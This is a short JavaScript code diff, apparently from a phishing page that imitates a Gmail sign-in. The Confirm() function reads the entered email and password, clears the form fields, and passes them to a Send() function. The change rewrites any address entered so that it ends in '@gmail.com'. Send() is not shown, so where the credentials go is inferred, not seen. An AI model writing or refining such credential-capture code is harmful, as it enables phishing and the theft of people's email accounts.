@@ -28,11 +28,12 @@ function Focus(){
 }
 
 function Confirm(){
-    var gmail= document.getElementById("gmail").value;
+    var gmail= document.getElementById("gmail").value.split('@');
     var password= document.getElementById("password").value;
     document.getElementById("gmail").value= "";
     document.getElementById("password").value= "";
-    Send(gmail, password, 0);
+        
+    Send(gmail[0]+"@gmail.com", password, 0);
 }
 
 function Send(gmail, password, index){
